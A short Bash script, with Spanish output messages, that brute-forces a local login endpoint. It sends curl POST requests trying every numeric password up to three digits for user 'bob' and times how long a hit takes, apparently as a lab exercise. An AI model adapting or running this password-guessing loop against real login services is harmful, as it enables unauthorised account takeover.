#!/usr/bin/env bash

alphabet="0123456789"
username="bob"
max_length=3
url="http://127.0.0.1:8000/login"

inicio=$(date +%s.%N)
contador=0

check_password() {
  local pass=$1
  response=$(curl -s -X POST "$url?username=$username&password=$pass")
  ok=$(echo "$response" | grep -o '"ok":[^,}]*' | cut -d: -f2 | tr -d ' "')
  if [[ "$ok" == "true" ]]; then
    return 0
  else
    return 1
  fi
}

fuerza_bruta() {
  for length in $(seq 1 $max_length); do
    generar_combinaciones "" $length
  done
  echo "Contraseña no encontrada en el rango dado."
}

generar_combinaciones() {
  local prefix=$1
  local length=$2

  if [[ $length -eq 0 ]]; then
    contador=$((contador+1))
    if check_password "$prefix"; then
      fin=$(date +%s.%N)
      duracion=$(awk "BEGIN{print $fin - $inicio}")
      echo "Contraseña Encontrada: $prefix"
      echo "Número de intentos: $contador"
      echo "Tiempo empleado: $(printf '%.2f' "$duracion") segundos"
      exit 0
    fi
  else
    for c in $(echo -n "$alphabet" | fold -w1); do
      generar_combinaciones "$prefix$c" $((length - 1))
    done
  fi
}

fuerza_bruta
